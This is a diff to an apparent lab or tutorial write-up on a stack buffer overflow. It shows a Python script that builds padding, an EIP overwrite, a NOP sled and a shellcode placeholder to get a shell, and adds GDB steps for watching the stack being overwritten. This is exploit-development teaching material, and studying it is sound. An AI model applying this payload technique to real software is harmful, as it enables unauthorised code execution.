@@ -11,6 +11,7 @@ Let's try a bufferoverflow and override EIP which is the register which handle
 the next instruction to execute to a shellcode which will help us to execute
 a sh.
 
+
  1 : create the exploit printer
 
 #!/usr/bin/python
@@ -20,9 +21,20 @@ shellcode = (SHELLCODE)
 NOP = "\x90" * 100
 print pad + eip + NOP + shellcode
 
+help to understand : 
+put a breakpoint in the leave address, just after the gets functions.
+Execute the program in GDB with :
+run < <(python /tmp/exploit)
+
 This exploit will write A until the EIP address.
 We must override the EIP address with the direct following address of the location of EIP.
 The next instruction which will be read will be the NOP then the shellcode.
+
+HELP :
+At this moment, you can execute the commend : x/100xw to see the current overwrite stack.
+You can also try to run without any argument, to see the difference.
+
+
 
 
 
